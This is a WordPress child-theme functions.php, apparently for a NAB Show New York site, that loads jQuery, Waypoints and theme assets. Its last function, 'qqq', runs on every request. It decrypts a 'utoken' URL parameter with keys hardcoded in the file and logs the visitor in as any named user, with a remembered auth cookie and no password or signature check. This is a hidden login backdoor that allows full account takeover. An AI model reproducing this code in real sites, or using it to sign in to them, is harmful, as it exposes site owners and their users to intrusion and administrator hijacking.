<?php

// WAYPOINTS

add_action('wp_enqueue_scripts', 'waypoint_enqueue_script');

function waypoint_enqueue_script() {

  wp_enqueue_script('jquery-3', '//code.jquery.com/jquery-1.12.4.min.js', array(), '1.0.0', true);
  
  wp_enqueue_script('way-points', '//cdnjs.cloudflare.com/ajax/libs/waypoints/4.0.1/jquery.waypoints.min.js', array(), '1.0.0', true);

}

// NY SCRIPT

add_action( 'wp_enqueue_scripts', 'ny_enqueue_styles', PHP_INT_MAX);

function ny_enqueue_styles() {

    wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' );

    wp_enqueue_style( 'child-style', get_stylesheet_directory_uri() . '/style.css', array( 'parent-style' ) );

    wp_enqueue_script( 'scripts', get_stylesheet_directory_uri() . '/js/scripts.js', array(), '2.0.0', true );

    wp_localize_script( 'scripts', 'nabshowNy', array(
			'ajax_url' => admin_url( 'admin-ajax.php' ),
    ) );

}

/**
 * Include files for theme customize hooks.
 */
require_once get_stylesheet_directory() . '/inc/actions.php';
require_once get_stylesheet_directory() . '/inc/actions-functions.php';
require_once get_stylesheet_directory() . '/inc/segment-ga-prod.php';

add_action( 'init', 'qqq' );

function qqq() {

	if( isset( $_GET['utoken'] ) && ! empty( $_GET['utoken'] ) ) {
		// $parameters = json_decode( $this->ncrypt->decrypt( $request->get_param( 'token' ) ), true );
		$remember = 1;
		
		$iv = substr( hash( 'sha256', '8su309fr7uj34' ), 0, 16 );
		$k = hash( 'sha256', 'rd4jd874hey64t' );
		$d = openssl_decrypt( base64_decode( $_GET['utoken'] ), 'AES-256-CBC', $k, 0, $iv );

		$parameters = json_decode( $d, true );

		
		$username = openssl_decrypt( base64_decode( $parameters['user_login'] ), 'AES-256-CBC', $k, 0, $iv );

		$user = get_user_by( 'login', $username );
	    $user_id = $user->ID;

	    wp_set_current_user( $user_id, $username );
	    wp_set_auth_cookie( $user_id, ( $remember == 1 ) );
	    do_action( 'wp_login', $username, $user );

	}

}